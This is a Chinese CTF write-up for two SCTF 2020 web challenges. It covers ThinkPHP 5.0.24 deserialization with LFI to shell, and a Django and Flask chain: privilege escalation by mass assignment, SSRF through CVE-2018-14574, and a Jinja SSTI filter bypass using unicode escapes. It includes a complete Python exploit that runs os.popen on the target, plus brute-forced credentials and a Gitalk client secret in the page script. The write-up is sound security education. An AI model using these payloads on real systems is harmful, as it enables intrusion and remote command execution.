<blockquote><h2 id="UnsafeDefenseSystem">UnsafeDefenseSystem</h2>
<p>PHP/5.6.26, tp 5.0.24<br>
经过一番吐血的信息搜集，看到了这个破静态站的源码里竟然有注释</p>
<img src="/2020/07/07/</blockquote><h2 id="UnsafeDefenseSystem">UnsafeDefenseSystem</h2><p>PHP/5.6.26, tp 5.0.24<br>经过一番吐血的信息搜集，看到了这个破静态站的源码里竟然有注释</p><img src="/2020/07/07/Security/Writeup/SCTF-2020-Web/hint.png" class="" title="hint in comment"><blockquote><p>我要对出题人使出极限一换一</p></blockquote><p>访问/protect.py能看到一个超长的憨批监控脚本，其实也不用看<br>在静态站注释提示的/public/nationalsb/login.php的注释中又看到了关于密码的提示</p><img src="/2020/07/07/Security/Writeup/SCTF-2020-Web/passwd_hint.png" class="" title="passwd_hint"><p>通过爆破得到用户名密码：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Admin1964752</span><br><span class="line">DsaPPPP!@#amspe1221</span><br></pre></td></tr></table></figure><p>后台存在lfi。经过一番读文件，看到index controller中存在反序列化点</p><img src="/2020/07/07/Security/Writeup/SCTF-2020-Web/entry.png" class="" title="unserialize entry"><p>结合上文所知道的thinkphp版本可以搜到:</p><p><a href="https://althims.com/2020/02/07/thinkphp-5-0-24-unserialize/">https://althims.com/2020/02/07/thinkphp-5-0-24-unserialize/</a><br><a href="https://xz.aliyun.com/t/7594">https://xz.aliyun.com/t/7594</a></p><p><a href="http://xn--protect-gq4kgoltk9x2jgvm3c8kpghez02h8zvad37bkmqos5b.py">出题人可能是想让条件竞争过protect.py</a>，但是实际上我们可以往/tmp目录底下写文件，并且在nationalsb那里包含这一文件，最终拿到shell</p><img src="/2020/07/07/Security/Writeup/SCTF-2020-Web/phpinfo.png" class="" title="phpinfo"><h2 id="jsonhub">jsonhub</h2><p>白盒审计。对外开放的是web1，一个Django服务，内网还有个flask。</p><p>首先整理思路：首先要过那个django的token，然后ssrf请求flask_rpc，这样才能带上Content-Type发POST请求</p><img src="/2020/07/07/Security/Writeup/SCTF-2020-Web/create_user.png" class="" title="User creation flaw"><p>很明显，注册的时候参数完全可控，也就是说可以伪造管理员身份。将两个字段，<code>is_superuser</code>与<code>is_staff</code>都设置为True，就能访问 <code>http://39.104.19.182/admin/app/token/</code> 拿到token了。</p><p>在请求后方flask服务前，django服务对<code>REMOTE_URL</code>进行了验证。由于题目部署在了docker里，访问公网ip时<code>REMOTE_URL</code>实际上是172.多少多少（即使不在docker里也是公网ip）。</p><p><a href="https://xz.aliyun.com/t/3302">https://xz.aliyun.com/t/3302</a><br>利用CVE-2018-14574漏洞进行跳转即可</p><p>再看第二个服务：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.before_request</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">before_request</span>():</span></span><br><span class="line">    data = <span class="built_in">str</span>(request.data)</span><br><span class="line">    log()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;&#123;&#123;&quot;</span> <span class="keyword">in</span> data <span class="keyword">or</span> <span class="string">&quot;&#125;&#125;&quot;</span> <span class="keyword">in</span> data <span class="keyword">or</span> <span class="string">&quot;&#123;%&quot;</span> <span class="keyword">in</span> data <span class="keyword">or</span> <span class="string">&quot;%&#125;&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">        abort(<span class="number">401</span>)</span><br><span class="line">...</span><br><span class="line">    json.loads(...)</span><br></pre></td></tr></table></figure><p>python中的json模块在解析json时会自动将转义过的字符恢复，所以可以用<code>&quot;\u007b&quot;</code>来绕过<code>before_request</code><br>关于表达式的正则过滤，由于对符号的过滤不严格导致了一个非预期，甚至完全不需要管num1和num2：</p><p>exploit:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> Request, session, get, post</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">HOST = <span class="string">&#x27;http://39.104.19.182&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ses = session()</span><br><span class="line">USER = <span class="string">&#x27;frkasdf&#x27;</span></span><br><span class="line">PASS = <span class="string">&#x27;qwer&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># session 默认keep-alive，这个服务端好像有点连接性问题，所以单独请求</span></span><br><span class="line">post(HOST + <span class="string">&#x27;/reg/&#x27;</span>, json=&#123;</span><br><span class="line">    <span class="string">&#x27;username&#x27;</span>: USER,</span><br><span class="line">    <span class="string">&#x27;password&#x27;</span>: PASS,</span><br><span class="line">    <span class="string">&#x27;is_staff&#x27;</span>: <span class="literal">True</span>,</span><br><span class="line">    <span class="string">&#x27;is_superuser&#x27;</span>: <span class="literal">True</span></span><br><span class="line">&#125;).json()[<span class="string">&#x27;code&#x27;</span>]</span><br><span class="line"></span><br><span class="line">ses.post(HOST + <span class="string">&#x27;/login/&#x27;</span>, json=&#123;</span><br><span class="line">    <span class="string">&#x27;username&#x27;</span>: USER,</span><br><span class="line">    <span class="string">&#x27;password&#x27;</span>: PASS,</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">page = BeautifulSoup(get(</span><br><span class="line">    HOST + <span class="string">&#x27;/admin/app/token/&#x27;</span>, cookies=ses.cookies</span><br><span class="line">).text, <span class="string">&#x27;lxml&#x27;</span>)</span><br><span class="line">token = page.find(<span class="string">&#x27;td&#x27;</span>, attrs=&#123;<span class="string">&#x27;class&#x27;</span>: <span class="string">&#x27;field-Token&#x27;</span>&#125;).text</span><br><span class="line"></span><br><span class="line">ssti = <span class="string">&#x27;&#123;&#123;config.__class__.__init__.__globals__[&quot;os&quot;].popen(&quot;/readflag&quot;).read() + &quot;&quot;&#125;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">payload = (<span class="string">&#x27;&#123;&#x27;</span> + json.dumps(&#123;</span><br><span class="line">    <span class="string">&#x27;num1&#x27;</span>: <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;num2&#x27;</span>: <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;symbols&#x27;</span>: ssti,</span><br><span class="line">&#125;)[<span class="number">1</span>:-<span class="number">1</span>].replace(<span class="string">&#x27;&#123;&#x27;</span>, <span class="string">&#x27;\\u007b&#x27;</span>).replace(<span class="string">&#x27;&#125;&#x27;</span>, <span class="string">&#x27;\\u007d&#x27;</span>) + <span class="string">&#x27;&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = b64encode(payload.encode()).decode()</span><br><span class="line"></span><br><span class="line">req = Request(<span class="string">&#x27;GET&#x27;</span>, HOST + <span class="string">&#x27;//127.0.0.1:8000/flask_rpc&#x27;</span>, params=&#123;</span><br><span class="line">    <span class="string">&#x27;methods&#x27;</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;url&#x27;</span>: <span class="string">&#x27;http://localhost:5000/caculator&#x27;</span>,</span><br><span class="line">    <span class="comment"># flask在:5000</span></span><br><span class="line">    <span class="string">&#x27;data&#x27;</span>: payload</span><br><span class="line">&#125;).prepare()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(json.loads(ses.post(HOST + <span class="string">&#x27;/home/&#x27;</span>, json=&#123;</span><br><span class="line">    <span class="string">&#x27;url&#x27;</span>: req.url,</span><br><span class="line">    <span class="string">&#x27;token&#x27;</span>: token</span><br><span class="line">&#125;).json()[<span class="string">&#x27;message&#x27;</span>])[<span class="string">&#x27;message&#x27;</span>])</span><br></pre></td></tr></table></figure><div id="gitalk-container"></div><script src="https://cdn.bootcss.com/blueimp-md5/2.12.0/js/md5.min.js"></script><link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css"><script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script><script>var gitalkConfig = {"clientID":"5955d155fe2ea768241e","clientSecret":"f96bbda9ff434950217f24f7f9369f8b8de3b025","repo":"frankli0324.github.io","owner":"frankli0324","admin":["frankli0324"],"distractionFreeMode":false};    gitalkConfig.id = md5(location.pathname);var gitalk = new Gitalk(gitalkConfig);    gitalk.render("gitalk-container");    </script><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>